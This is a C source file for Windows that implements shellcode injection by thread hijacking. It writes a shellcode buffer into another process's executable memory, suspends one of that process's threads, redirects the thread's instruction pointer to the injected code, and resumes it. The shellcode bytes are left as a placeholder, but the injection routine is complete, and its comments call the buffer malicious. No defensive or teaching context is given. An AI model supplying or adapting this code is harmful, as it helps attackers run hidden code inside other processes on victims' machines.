#include <windows.h>
#include <tlhelp32.h>

// Shellcode definition
unsigned char shellcode[] = {
    // ... (shellcode bytes)
};

void InjectAndHijackThread(DWORD processId) {
    // Step 1: Open the target process with all access rights.
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS, // Requests all possible access rights
        FALSE, // Child processes do not inherit parent process handle
        processId // Stored process ID
    );

    // Step 2: Allocate memory in the target process for the shellcode.
    PVOID remoteBuffer = VirtualAllocEx(
        hProcess, // Opened target process
        NULL,
        sizeof(shellcode), // Region size of memory allocation
        (MEM_RESERVE | MEM_COMMIT), // Reserves and commits pages
        PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the committed pages
    );

    // Step 3: Write the shellcode into the allocated memory in the target process.
    WriteProcessMemory(
        hProcess, // Opened target process
        remoteBuffer, // Allocated memory region
        shellcode, // Data to write
        sizeof(shellcode), // Byte size of data
        NULL
    );

    // Step 4: Create a snapshot of all threads in the system to find the target thread.
    THREADENTRY32 threadEntry;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(
        TH32CS_SNAPTHREAD, // Include all processes residing on the system
        0 // Indicates the current process
    );

    // Step 5: Loop through the snapshot to find the thread associated with the target process.
    threadEntry.dwSize = sizeof(THREADENTRY32);
    if (Thread32First(hSnapshot, &threadEntry)) {
        do {
            if (threadEntry.th32OwnerProcessID == processId) { // Verifies both parent process ID's match
                // Step 6: Open the target thread with all access rights.
                HANDLE hThread = OpenThread(
                    THREAD_ALL_ACCESS, // Requests all possible access rights
                    FALSE, // Child threads do not inherit parent thread handle
                    threadEntry.th32ThreadID // Reads the thread ID from the THREADENTRY32 structure pointer
                );

                // Step 7: Suspend the target thread.
                SuspendThread(hThread);

                // Step 8: Get the context of the target thread.
                CONTEXT context;
                context.ContextFlags = CONTEXT_FULL; // Specify which parts of the context to retrieve
                GetThreadContext(hThread, &context);

                // Step 9: Set the instruction pointer (RIP) to point to our malicious buffer allocation.
                context.Rip = (DWORD_PTR)remoteBuffer; // Points RIP to our malicious buffer allocation

                // Step 10: Set the updated context to the target thread.
                SetThreadContext(hThread, &context);

                // Step 11: Resume the target thread to execute the shellcode.
                ResumeThread(hThread);

                // Close the handle to the target thread.
                CloseHandle(hThread);

                break;
            }
        } while (Thread32Next(hSnapshot, &threadEntry));
    }

    // Close the handle to the snapshot and the target process.
    CloseHandle(hSnapshot);
    CloseHandle(hProcess);
}
